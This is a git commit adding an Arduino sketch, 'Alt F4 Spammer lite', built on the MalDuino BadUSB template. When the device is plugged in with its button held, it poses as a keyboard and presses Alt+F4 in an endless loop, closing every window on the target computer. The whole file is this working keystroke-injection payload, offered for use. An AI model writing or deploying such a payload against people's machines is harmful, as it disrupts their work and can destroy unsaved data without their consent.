bfcf79de5b7cfd5d6978476e5ed94e3957ebed1e
kai <kai9987kai@gmail.com>
2019-02-08 21:15:32 +0000

    Alt F4 Spammer

---
+++ Alt F4 Spammer/Alt F4 Spammer lite/lite.ino
@@ -0,0 +1,58 @@
+/*
+Copyright (c) 2017 Seytonic, Spacehuhn (Licensed under MIT)
+For more information see: github.com/seytonic/malduino
+*/
+
+#include "Keyboard.h"
+#include "Mouse.h"
+
+#define blinkInterval 50
+#define ledPin 3
+#define buttonPin 6
+
+int defaultDelay = 4;
+int defaultCharDelay = 5;
+int rMin = 0;
+int rMax = 100;
+
+bool ledOn = true;
+
+void typeKey(int key){
+  Keyboard.press(key);
+  delay(defaultCharDelay);
+  Keyboard.release(key);
+}
+
+void setup(){
+  
+  pinMode(buttonPin, INPUT_PULLUP);
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, HIGH);
+  
+  if(digitalRead(buttonPin) == LOW){
+    
+    Keyboard.begin();
+    Mouse.begin();
+    
+    /* ----- Begin-Script -----*/
+    
+    /* [Parsed By Duckuino (Licensed under MIT) - for more information visit: https://github.com/Nurrl/Dckuino.js] */    
+    delay(1250);
+
+    delay(defaultDelay);
+    while(1){
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press(KEY_F4);
+    Keyboard.releaseAll();
+    };
+    /* ----- End-Script -----*/
+    
+    Keyboard.end();
+  }
+}
+
+void loop(){
+  ledOn = !ledOn;
+  digitalWrite(ledPin, ledOn);
+  delay(blinkInterval);
+}
